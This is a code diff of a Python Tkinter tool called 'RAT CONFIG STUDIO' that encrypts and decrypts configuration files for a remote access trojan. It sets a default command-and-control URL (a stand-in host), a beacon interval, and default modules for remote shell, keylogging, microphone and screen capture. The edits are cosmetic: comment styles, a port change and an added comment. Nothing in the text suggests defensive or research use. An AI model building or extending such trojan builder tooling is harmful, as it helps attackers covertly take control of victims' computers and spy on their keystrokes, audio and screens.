@@ -8,7 +8,7 @@ import os
 import json
 import base64
 
-# === Key Logic ===
+# Key Logic 
 
 def generate_key():
     key = os.urandom(32)
@@ -23,7 +23,7 @@ def save_key():
             file.write(key)
         messagebox.showinfo("Saved", f"Key saved to {f}")
 
-# === Encrypt Config ===
+# Encrypt Config 
 
 def encrypt_config():
     try:
@@ -49,7 +49,7 @@ def encrypt_config():
     except Exception as e:
         messagebox.showerror("Encrypt Error", str(e))
 
-# === Decrypt Config ===
+# Decrypt Config 
 
 def decrypt_config():
     try:
@@ -71,7 +71,7 @@ def decrypt_config():
     except Exception as e:
         messagebox.showerror("Decrypt Error", str(e))
 
-# === GUI Setup ===
+# GUI Setup 
 
 root = tk.Tk()
 root.title("RAT CONFIG STUDIO")
@@ -95,7 +95,7 @@ frame_encrypt.pack(fill="x", padx=10, pady=5)
 
 tk.Label(frame_encrypt, text="C2_URL:").grid(row=0, column=0, sticky="e")
 entry_c2 = tk.Entry(frame_encrypt, width=60)
-entry_c2.insert(0, "https://yourc2.host:8443")
+entry_c2.insert(0, "https://yourc2.host:8080")
 entry_c2.grid(row=0, column=1)
 
 tk.Label(frame_encrypt, text="INTERVAL:").grid(row=1, column=0, sticky="e")
@@ -105,7 +105,7 @@ entry_interval.grid(row=1, column=1, sticky="w")
 
 tk.Label(frame_encrypt, text="MODULES (comma):").grid(row=2, column=0, sticky="e")
 entry_modules = tk.Entry(frame_encrypt, width=60)
-entry_modules.insert(0, "shell,keylog,mic,screen")
+entry_modules.insert(0, "shell,keylog,mic,screen") # you can add or change these
 entry_modules.grid(row=2, column=1)
 
 tk.Button(frame_encrypt, text="Encrypt Config", command=encrypt_config).grid(row=3, column=0, columnspan=2, pady=5)
